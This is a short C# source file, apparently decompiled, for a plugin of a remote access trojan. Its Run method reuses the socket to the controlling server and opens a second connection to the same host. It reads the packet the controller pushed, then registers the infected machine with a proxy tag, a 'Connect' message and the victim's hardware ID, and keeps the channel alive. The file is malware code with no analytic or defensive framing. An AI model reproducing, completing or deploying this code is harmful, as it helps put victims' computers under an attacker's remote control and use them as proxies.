using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Leb128;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public static string TagProxy;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client client = new Client();
		client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1], itsmain: true);
		if (client.itsConnect)
		{
			Packet.Read(Pack, null);
			client.Send(LEB128.Write(new object[3] { TagProxy, "Connect", Hwid }));
		}
		while (client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		client.Disconnect();
		Thread.Sleep(5000);
	}
}
